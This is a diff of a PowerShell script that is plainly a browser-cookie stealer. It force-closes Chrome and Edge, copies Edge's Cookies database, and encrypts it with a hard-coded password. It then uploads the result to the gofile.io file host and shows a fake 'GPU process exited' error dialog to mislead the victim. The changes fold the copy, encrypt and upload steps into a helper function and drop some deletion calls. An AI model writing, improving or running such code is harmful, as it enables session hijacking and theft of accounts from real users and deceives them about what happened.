@@ -129,10 +129,16 @@ function delete-data {
 
     }
 }
+
+Start-Sleep -Seconds 1
 Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
 $kerch=$?
-Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "msedge" -ErrorAction SilentlyContinue
 $sek=$?
+Start-Sleep -Seconds 1
+
+Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+
 Start-Sleep -Seconds 1
 
 $op = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
@@ -154,15 +160,25 @@ $fid=creat-FilesToGofile
 Protect-File -FilePath $dbp -p "For_oNS."
 
 Upload-FilesToGofile -FilePath "$dbp.crypt" -newFolderId $fid
-if ($kerch) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Error")
+if ($sek) {
+    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Error")
 }
 
-Copy-Item $op2 $dbp2 -Force
-Copy-Item $op3 $dbp3 -Force
-Copy-Item $op4 $dbp4 -Force
-Copy-Item $op5 $dbp5 -Force
-Copy-Item $op6 $dbp6 -Force
+function Dosf-it-all {
+    param (
+        [string]$path1,
+        [string]$path2,
+        [string]$fid
+    )
+    Copy-Item $path1 $path2 -Force
+    Protect-File -FilePath $path2 -p "For_oNS."
+    Upload-FilesToGofile -FilePath "$path2.crypt" -newFolderId $fid
+}
+
+
+
+
+
 
 
 
@@ -182,34 +198,15 @@ $uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
 #crypt
 
 
-Protect-File -FilePath $dbp2 -p "For_oNS."
-Protect-File -FilePath $dbp3 -p "For_oNS."
-Protect-File -FilePath $dbp4 -p "For_oNS."
-Protect-File -FilePath $dbp5 -p "For_oNS."
-Protect-File -FilePath $dbp6 -p "For_oNS."
-#uplo
 
-Upload-FilesToGofile -FilePath "$dbp2.crypt" -newFolderId $fid
-Upload-FilesToGofile -FilePath "$dbp3.crypt" -newFolderId $fid
-Upload-FilesToGofile -FilePath "$dbp4.crypt" -newFolderId $fid
-Upload-FilesToGofile -FilePath "$dbp5.crypt" -newFolderId $fid
-Upload-FilesToGofile -FilePath "$dbp6.crypt" -newFolderId $fid
+#uplo
+Dosf-it-all -path1 $op3 -path2 $dbp3 -fid $fid
+
 
 Start-Sleep -Seconds 1
 #delete
-delete-data -op $op -p "s"
-delete-data -op $op2 -p "s"
-delete-data -op $op3 -p "s"
-delete-data -op $op4 -p "s"
-delete-data -op $op5 -p "s"
-delete-data -op $op6 -p "s"
 
 
 
 
 
-
-
-if ($sek) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Error")
-}
